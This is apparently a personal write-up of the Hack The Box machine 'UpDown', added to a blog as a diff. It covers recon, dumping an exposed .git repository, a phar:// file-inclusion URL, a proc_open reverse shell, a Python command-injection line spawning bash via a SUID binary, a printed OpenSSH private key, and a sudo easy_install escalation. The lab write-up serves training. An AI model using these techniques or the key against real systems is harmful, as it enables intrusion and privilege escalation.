@@ -1,0 +1,455 @@
+---
+layout: /src/layouts/PostLayout.astro
+title: UpDown
+tags: []
+---
+**Start 15:19 20-09**
+
+---
+```
+Scope:
+10.10.11.177
+```
+## Recon
+
+==Nmap==
+```bash
+┌──(kali㉿kali)-[~]
+└─$ nmap -sC -sV -sT -vvvv -T5 -p- 10.10.11.177 --min-rate 5000
+
+PORT   STATE SERVICE REASON  VERSION
+22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 9e:1f:98:d7:c8:ba:61:db:f1:49:66:9d:70:17:02:e7 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDl7j17X/EWcm1MwzD7sKOFZyTUggWH1RRgwFbAK+B6R28x47OJjQW8VO4tCjTyvqKBzpgg7r98xNEykmvnMr0V9eUhg6zf04GfS/gudDF3Fbr3XnZOsrMmryChQdkMyZQK1HULbqRij1tdHaxbIGbG5CmIxbh69mMwBOlinQINCStytTvZq4btP5xSMd8pyzuZdqw3Z58ORSnJAorhBXAmVa9126OoLx7AzL0aO3lqgWjo/wwd3FmcYxAdOjKFbIRiZK/f7RJHty9P2WhhmZ6mZBSTAvIJ36Kb4Z0NuZ+ztfZCCDEw3z3bVXSVR/cp0Z0186gkZv8w8cp/ZHbtJB/nofzEBEeIK8gZqeFc/hwrySA6yBbSg0FYmXSvUuKgtjTgbZvgog66h+98XUgXheX1YPDcnUU66zcZbGsSM1aw1sMqB1vHhd2LGeY8UeQ1pr+lppDwMgce8DO141tj+ozjJouy19Tkc9BB46FNJ43Jl58CbLPdHUcWeMbjwauMrw0=
+|   256 c2:1c:fe:11:52:e3:d7:e5:f7:59:18:6b:68:45:3f:62 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKMJ3/md06ho+1RKACqh2T8urLkt1ST6yJ9EXEkuJh0UI/zFcIffzUOeiD2ZHphWyvRDIqm7ikVvNFmigSBUpXI=
+|   256 5f:6e:12:67:0a:66:e8:e2:b7:61:be:c4:14:3a:d3:8e (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIL1VZrZbtNuK2LKeBBzfz0gywG4oYxgPl+s5QENjani1
+80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Is my Website up ?
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+I went to the website and added the hostname to `/etc/hosts`:
+
+![](../../../assets/136317817782d0891d0a90f5cd354273.png)
+
+And then I went ahead and started looking for subdomains and subdirectories since there was nothing notable on the site. I used `ffuf` to locate any subdomains which initially responded with false positives:
+
+![](../../../assets/01825017352a4245671c093ce2fef508.png)
+
+So I then went ahead and `excluded` all the responses with size `1131`:
+
+```bash
+ffuf -u http://siteisup.htb -H "Host: FUZZ.siteisup.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 1131
+```
+
+![](../../../assets/4caa90f9f947caf7d729d6edff2ae1dd.png)
+
+After successfully fuzzing a new subdomain I added it to my `/etc/hosts` list again: 
+
+```bash
+echo "10.10.11.177 dev.siteisup.htb" | sudo tee -a /etc/hosts
+```
+
+
+## 80/TCP - HTTP
+
+After having successfully added the subdomain I tried to visit the site, yet I ran into a problem:
+
+![](../../../assets/4832fef8e3c51154033d7511f28b2acf.png)
+
+Which makes sense as the output from `ffuf` showed us the same `403` response. Time to enumerate further using `gobuster`:
+
+![](../../../assets/154b5c07c49f807ee5e40b27d5c188e9.png)
+
+But when we visit `/dev` it is just an empty page:
+
+![](../../../assets/fb1146dcbe35eea7d14a86cac5e636af.png)
+
+So I went ahead and ran `gobuster` again on the `/dev` endpoint this time:
+
+![](../../../assets/fbaba59e867cd5e61fe3025457657d8b.png)
+
+It looks like there is an exposed `.git` endpoint, I decided to check it out using `curl`:
+
+![](../../../assets/8d1507dd5af81545c453916595df1bcc.png)
+
+
+==Git-Dumper==
+Apparently a tool called `git-dumper` exists with which you can go ahead and dump entire `git` repositories if they are exposed.
+I installed it using `pip install git-dumper` as per the [official repo instructions](https://github.com/arthaud/git-dumper).
+
+Running this tool gave me the following output:
+
+![](../../../assets/3c6b96e7fb2235b206461a32132db3b0.png)
+
+I then went inside the new `dev` directory I just created and checked the directory using `ls -la`:
+
+![](../../../assets/72409b2f4546e858e69e09bbb0da1dfd.png)
+
+I found the `.htaccess` file which usually contains `Apache` web server configs:
+
+![](../../../assets/5dc1bf87463f368ed4e446869c6a647c.png)
+https://www.digitalocean.com/community/tutorials/how-to-use-the-htaccess-file
+
+I used `cat` on the file and read it:
+
+![](../../../assets/b116bbd78925e6742075167ffdea480c.png)
+
+Since I need to specify the header on every request I will instead automate this using `Burp`
+I have to go to the `Proxy` settings -> `Match and replace rules` -> `Add` and enter a new set of rules:
+
+![](../../../assets/8fddd79c154bfd43e1d0abbec24db985.png)
+
+![](../../../assets/a63eaaeb760c6a6b40e5d5d473679d4a.png)
+
+
+==dev subdomain==
+After adding these rules I visit the main page again and I am greeted with the new dashboard:
+
+![](../../../assets/621534094194150582d8cdb7af8473c8.png)
+
+I created a sample list of sites to view the behavior:
+
+![](../../../assets/1f53fe18d9641b6d83a5f63116738a4b.png)
+
+And I uploaded it to the website:
+
+![](../../../assets/1002a4ca17aae46a781f85b1ae1eee6d.png)
+
+I got the following response:
+
+![](../../../assets/618298f309b9b72c50443845b6fc2ce6.png)
+
+It is unclear to me what the 4th check is and why it popped up so I decided to check the source code, which was in the `dev git dump` folder.
+
+```php
+# Admin.php
+
+<?php
+if(DIRECTACCESS){
+        die("Access Denied");
+}
+
+#ToDo
+?>
+```
+
+The above appears to show a `DIRECTACCESS` function that we can find in the `index.php` file.
+
+```php
+# Index.php
+
+<b>This is only for developers</b>
+<br>
+<a href="?page=admin">Admin Panel</a>
+<?php
+        define("DIRECTACCESS",false);
+        $page=$_GET['page'];
+        if($page && !preg_match("/bin|usr|home|var|etc/i",$page)){
+                include($_GET['page'] . ".php");
+        }else{
+                include("checker.php");
+        }
+?>
+```
+
+The `index.php` file appears to check for the inclusion of `$_GET['page']` which prevents us from accessing the specified directories, and if the `GET` parameter is not supplied it will include the `checker.php` file. This was a quite extensive file but the following is the most important part:
+
+```php
+# Checker.php
+
+if($_POST['check']){
+  
+        # File size must be less than 10kb.
+        if ($_FILES['file']['size'] > 10000) {
+        die("File too large!");
+    }
+        $file = $_FILES['file']['name'];
+
+        # Check if extension is allowed.
+        $ext = getExtension($file);
+        if(preg_match("/php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar/i",$ext)){
+                die("Extension not allowed!");
+        }
+  
+        # Create directory to upload our file.
+        $dir = "uploads/".md5(time())."/";
+        if(!is_dir($dir)){
+        mkdir($dir, 0770, true);
+    }
+  
+  # Upload the file.
+        $final_path = $dir.$file;
+        move_uploaded_file($_FILES['file']['tmp_name'], "{$final_path}");
+
+  # Read the uploaded file.
+        $websites = explode("\n",file_get_contents($final_path));
+
+        foreach($websites as $site){
+                $site=trim($site);
+                if(!preg_match("#file://#i",$site) && !preg_match("#data://#i",$site) && !preg_match("#ftp://#i",$site)){
+                        $check=isitup($site);
+                        if($check){
+                                echo "<center>{$site}<br><font color='green'>is up ^_^</font></center>";
+                        }else{
+                                echo "<center>{$site}<br><font color='red'>seems to be down :(</font></center>";
+                        }
+                }else{
+                        echo "<center><font color='red'>Hacking attempt was detected !</font></center>";
+                }
+        }
+
+  # Delete the uploaded file.
+        @unlink($final_path);
+}
+```
+
+We notice that there has been a valiant attempt at stopping certain file extensions to be uploaded. Furthermore it appears that the file get's uploaded to a `/uploads/` endpoint and after the check has been completed the file get's automatically deleted.
+
+>Note: This approach of individually blacklisting certain extension is NOT desired since there are still certain extensions which can be packaged and uploaded. It is far better to `WHITELIST` certain extensions instead!
+
+
+==file upload==
+After looking up under what alternative we could upload a `web-shell` I stumbled upon the following:
+
+![](../../../assets/2f6adc8fba975e2567d9424329d65b38.png)
+https://pecl.php.net/package-search.php?pkg_name=phar 
+
+I went ahead and created a zipped up file which I would then go ahead and unwrap using the `phar://` `php wrapper`.
+
+![](../../../assets/b0e509fc5cb5698762677ea69e3aa42a.png)
+
+I uploaded the file and went into the `/uploads` endpoint to view whether it was uploaded correctly.
+
+![](../../../assets/60c84b71ae4302f2ed2eed4666d3accb.png)
+
+Since the file was there inside the folder I used the following `URL` to view the contents:
+
+```bash
+http://dev.siteisup.htb/?page=phar://uploads/04ffd93eb78f31fa555193717bc23cf1/info.txt/info
+```
+
+![](../../../assets/87d551fb540dc01dc73001b18ad5f7f1.png)
+
+This proved that the file upload was indeed vulnerable to the `phar://` wrapper. I now skimmed the output in order to understand what sort of payload I could upload.
+
+Unfortunately enough I found multiple functions to be disabled which meant improvising:
+
+![](../../../assets/2344316e062ce8bf9e987cb9d810aea8.png)
+
+Fortunately for me though I found the following tool in a blog that could help me bypass this problem:
+
+![](../../../assets/0c20a7945d503328f150892d1b85781b.png)
+
+
+![](../../../assets/3ed9cefc915c1c32baa3c597ec9fdd59.png)
+https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass
+
+![](../../../assets/d9fe1e1048f7577ae6b15e7a9499cdb9.png)
+https://github.com/teambi0s/dfunc-bypasser
+
+I followed the `git clone` command and installed the tool after which I used it with `python2` (`python` or `python3` does NOT work!)
+
+![](../../../assets/4462a732cf843708ce8db5ea3f242510.png)
+
+I ran into some trouble at first so I had to reupload the file again:
+
+==fail==
+![](../../../assets/b77a87420cf4cc8e8097d6c87da4558d.png)
+
+==pass==
+![](../../../assets/942ecb16cfe9c320283468510a624325.png)
+
+It seems I need to use the `proc_open()` function according to the script. Since I had no clue how to use it I searched it up and found the following:
+
+![](../../../assets/09b5373c7200e9551ab83d6e81350bf9.png)
+https://www.php.net/manual/en/function.proc-open.php
+
+I now had to craft a reverse-shell using the `proc_open()` function.
+
+
+==crafting web shell==
+I went ahead and googled for `proc_open reverse shell` which led me to the following `GitHub`
+page:
+
+![](../../../assets/79f2066fb84908654eb76219172332a3.png)
+https://github.com/jbarcia/Web-Shells/blob/master/laudanum/php/php-reverse-shell.php
+
+I then went ahead and wrapped this around `<?php` tags as well as tweaked it a little bit:
+
+![](../../../assets/db4d6148be46ca63ae469b046e5d181f.png)
+
+I then went ahead and zipped it up just like previously:
+
+![](../../../assets/e6afd130ef8d02eead0ff17b703b0828.png)
+
+Now I went ahead and uploaded the file again:
+
+![](../../../assets/96227b9049cfc71da8dfafe824b3dcc9.png)
+
+I started up my listener at `1234` and went to the `URL`:
+
+![](../../../assets/46e0b7a8981f7288d68f89bb5e42cd2d.png)
+
+
+==www-data shell==
+And just like that I got the `www-data` shell:
+
+![](../../../assets/13396bfe7c99132b3c4b7f472a71b037.png)
+
+I then went ahead and created a `shell-ception` in case I accidently `Ctrl + C` the shell:
+
+![](../../../assets/46cf383517169009e276ab65a8ab9939.png)
+
+I stabilized that shell using the following commands:
+
+![](../../../assets/c0a5963fb31d7db7a34726faadd0e1de.png)
+
+I found nothing useful inside the directory I landed in (since I have already searched it previously) thus went to the `/` directory. Afterwards I `cd` into `/home` where I found the `developer` user. Inside his directory was the `user.txt` flag which I did not have permissions for but there was another `dev` directory as well:
+
+![](../../../assets/d8af52099b29052511e155065124101d.png)
+
+The `SUID` bit set is set for the `developer` on both files which means we can perhaps use this to our advantage.
+
+![](../../../assets/c8b72cc2c2e0da9d807c41310e06d894.png)
+
+From the `print` function we can tell that it is a `Python2` script. I tried to inject malicious commands since the `input` parameter does not properly sanitize it:
+
+![](../../../assets/c926e7b779de508fa25860fa78ea8ab5.png)
+
+And when I run the same on the binary I see the following:
+
+![](../../../assets/22762e565b29c65b4980caf859b27a94.png)
+
+
+==developer shell==
+I see it returned `developer` instead, thus it runs under that user. Meaning I just needed to change the command from `whoami` to `bash` in this case for the binary to grant me a shell under this user:
+
+```bash
+__import__('os').system('bash')
+```
+
+![](../../../assets/f0fcee723e07da4eb93cd4423e557eff.png)
+
+I was right! Just like that we have elevated our privileges and I got the user flag... or not since it is still owned by `root` :(
+
+Thus I had to get creative. I `ls -la` the `/home` directory of `developer` and found `authorized_keys` as well as `id_rsa.pub`. I checked if they matched and luckily for me they did:
+
+![](../../../assets/1b9253120e616ea48c157ffcd67e6b00.png)
+
+This meant that the `private key` should suffice to log into `SSH`.
+I used `cat` on `id_rsa`:
+
+```bash
+developer@updown:/home/developer/.ssh$ cat id_rsa
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+-----END OPENSSH PRIVATE KEY-----
+developer@updown:/home/developer/.ssh$
+```
+
+
+==user.txt==
+And then on my local machine I put the `private key` into a new file, change permissions and `ssh'd` into the machine:
+
+```bash
+┌──(kali㉿kali)-[~]
+└─$ cat > dev-key  
+
+┌──(kali㉿kali)-[~]
+└─$ chmod 600 dev-key
+
+┌──(kali㉿kali)-[~]
+└─$ ssh -i dev-key developer@siteisup.htb
+
+Last login: Tue Aug 30 11:24:44 2022 from 10.10.14.36
+developer@updown:~$ 
+```
+
+This way I could actually go ahead and `cat` the `user.txt` flag:
+
+![](../../../assets/23557727e8c24f65674841c0aa4510bc.png)
+
+
+## Privilege Escalation
+
+In order to escalate privileges I started off by using `sudo -l`:
+
+![](../../../assets/8b83e1750331cb1adb40cc71d558e40c.png)
+
+It appears I can run a binary without a password, let's check it out:
+
+```bash
+developer@updown:~$ cat /usr/local/bin/easy_install
+#!/usr/bin/python
+# -*- coding: utf-8 -*-
+import re
+import sys
+from setuptools.command.easy_install import main
+if __name__ == '__main__':
+    sys.argv[0] = re.sub(r'(-script\.pyw|\.exe)?$', '', sys.argv[0])
+    sys.exit(main())
+```
+
+By looking `easy_install` up on [GTFOBins](https://gtfobins.github.io/gtfobins/easy_install/) I found the way to exploit it:
+
+![](../../../assets/28b5159057cb71eac4e907195f3ec1ba.png)
+
+We need to essentially create a new directory, and leverage that directory to create a `root` shell by spawning it through the use of the `easy_install` script:
+
+![](../../../assets/7d7b48840c82bac4b85f64b23904dda2.png)
+
+
+==root.txt==
+Straightforward:
+
+![](../../../assets/3888a63605b41e5a73ddabe3b94e20fa.png)
+
+![](../../../assets/70e4be255c2b17ce4d26742f4081e93e.png)
+
+---
+
+**Finished 18:35 23-09**
+
+[^Links]: [[Hack The Box]] [[OSCP Prep]]
